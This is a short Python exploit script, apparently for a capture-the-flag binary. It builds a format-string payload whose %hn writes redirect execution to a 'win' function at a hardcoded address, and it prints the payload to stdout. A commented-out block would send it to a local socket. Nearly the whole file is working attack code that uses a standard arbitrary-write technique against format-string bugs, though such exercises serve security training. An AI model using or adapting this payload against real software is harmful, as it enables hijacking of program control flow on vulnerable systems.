import sys
import struct
import socket

'''
win = p(0x401272)

#ret = int(sys.argv[1], 0)
'''
fini = 0x403280 
rip =  int(sys.argv[1], 0)

p = b'%' + str(0x40).encode() + b'c'
p += b'%9$hn'
p += b'%' + str(0x1272 - 0x40).encode() + b'c'
p += b'%10$hn'
p += b'A'* ((9-6) * 8 - len(p))
p += struct.pack('Q', rip + 2)
p += struct.pack('Q', rip)
p += b'\n'

'''
address = 'localhost'
port = 4411

s = socket.create_connection((address, port))

s.send(p)

result = s.recv(0x800)
'''
sys.stdout.buffer.write(p)
